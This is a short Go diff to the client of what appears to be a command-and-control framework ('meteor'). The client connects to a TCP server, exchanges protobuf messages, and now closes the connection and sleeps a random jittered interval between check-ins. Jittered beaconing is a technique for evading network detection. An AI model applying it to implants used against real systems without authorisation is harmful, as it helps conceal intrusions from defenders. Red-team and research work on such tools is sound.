@@ -4,8 +4,10 @@ import (
 	cUtils "github.com/degenerat3/meteor/meteor/clients/utils"
 	"github.com/degenerat3/meteor/meteor/pbuf"
 	"github.com/golang/protobuf/proto"
+	"math/rand"
 	"net"
 	"os"
+	"time"
 )
 
 // SERVER is the IP/port of the TCP server to connect to (ex: `192.168.1.2:1234`)
@@ -67,9 +69,14 @@ func main() {
 			acnData, _ := proto.Marshal(acnResp)
 			conn.Write(acnData)
 			acnAck := make([]byte, 512)
-			conn.Read(acnAck)	// read the "Add response" status, even tho we don't check it rn
+			conn.Read(acnAck) // read the "Add response" status, even tho we don't check it rn
 		}
 		endCheck()
+		conn.Close()
+		min := INTERVAL - DELTA
+		max := INTERVAL + DELTA
+		sleeptime := rand.Intn(max-min) + min
+		time.Sleep(time.Duration(sleeptime) * time.Second)
 	}
 }
 
